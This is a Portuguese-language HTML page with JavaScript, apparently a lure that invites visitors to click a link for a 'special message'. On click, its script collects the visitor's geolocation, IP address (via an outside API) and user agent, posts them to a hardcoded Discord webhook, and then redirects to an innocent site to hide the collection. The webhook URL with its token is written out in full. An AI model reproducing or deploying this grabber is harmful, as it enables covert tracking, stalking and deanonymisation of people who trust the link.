<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>P√°gina especial</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #f5f7fa, #c3cfe2);
            color: #333;
        }
        .container {
            background: white;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 100%;
        }
        a {
            text-decoration: none;
            color: #0073e6;
            font-size: 18px;
            font-weight: 500;
            transition: color 0.3s ease;
        }
        a:hover {
            color: #005bb5;
            text-decoration: underline;
        }
        .loading {
            display: none;
            margin-top: 1rem;
            font-size: 14px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <p>Ol√°! Clique no link abaixo para ver uma mensagem especial:</p>
        <a id="specialLink" href="#" target="_blank">Clique aqui para continuar</a>
        <div id="loadingMessage" class="loading">Carregando...</div>
    </div>

    <script>
        const specialLink = document.getElementById('specialLink');
        const loadingMessage = document.getElementById('loadingMessage');

        // URL do webhook do Discord (substitua pelo seu webhook)
        const discordWebhookURL = 'https://discord.com/api/webhooks/1249056666033455225/T1iGo5pt8RrQoLeQ_nK2FEXU8zL6ehwxsqMbX02oVGsUoM6c880KQ4D2ZKEfZVflElke';

        // Fun√ß√£o para obter o IP do usu√°rio usando uma API externa
        const getIP = async () => {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Erro ao obter o IP:', error);
                return 'Desconhecido';
            }
        };

        // Fun√ß√£o para enviar informa√ß√µes para o Discord em um embed
        const sendInfoToDiscord = async (latitude, longitude, userAgent, ip) => {
            const embed = {
                title: "üìå Nova Informa√ß√£o Recebida",
                description: "Detalhes do usu√°rio coletados.",
                color: 0x00ff00, // Cor verde
                fields: [
                    {
                        name: "üåç Localiza√ß√£o",
                        value: `Latitude: ${latitude}\nLongitude: ${longitude}\n[Ver no Mapa](https://www.google.com/maps?q=${latitude},${longitude})`,
                    },
                    {
                        name: "üì± Dispositivo",
                        value: userAgent,
                    },
                    {
                        name: "üñ•Ô∏è IP",
                        value: ip,
                    },
                ],
                timestamp: new Date().toISOString(),
            };

            const message = {
                embeds: [embed],
            };

            try {
                await fetch(discordWebhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(message),
                });
            } catch (error) {
                console.error('Erro ao enviar informa√ß√µes para o Discord:', error);
            }
        };

        // Fun√ß√£o para obter a geolocaliza√ß√£o e outras informa√ß√µes
        const getLocationAndInfo = async () => {
            if (navigator.geolocation) {
                loadingMessage.style.display = 'block';
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const { latitude, longitude } = position.coords;
                        const userAgent = navigator.userAgent; // Obt√©m o user agent
                        const ip = await getIP(); // Obt√©m o IP
                        sendInfoToDiscord(latitude, longitude, userAgent, ip); // Envia para o Discord
                        // Redireciona para um link inofensivo ap√≥s coletar as informa√ß√µes
                        window.location.href = 'https://www.exemplo.com'; // Substitua pelo link desejado
                    },
                    (error) => {
                        console.error('Erro ao obter localiza√ß√£o:', error.message);
                        // Redireciona mesmo se a localiza√ß√£o falhar
                        window.location.href = 'https://www.exemplo.com'; // Substitua pelo link desejado
                    },
                    { timeout: 10000 } // Timeout de 10 segundos
                );
            } else {
                console.error('Geolocaliza√ß√£o n√£o √© suportada pelo navegador.');
                // Redireciona se a geolocaliza√ß√£o n√£o for suportada
                window.location.href = 'https://www.exemplo.com'; // Substitua pelo link desejado
            }
        };

        // Adiciona o evento de clique ao link
        specialLink.addEventListener('click', function(event) {
            event.preventDefault(); // Impede o comportamento padr√£o do link
            getLocationAndInfo(); // Coleta a localiza√ß√£o e outras informa√ß√µes
        });
    </script>
</body>
</html>
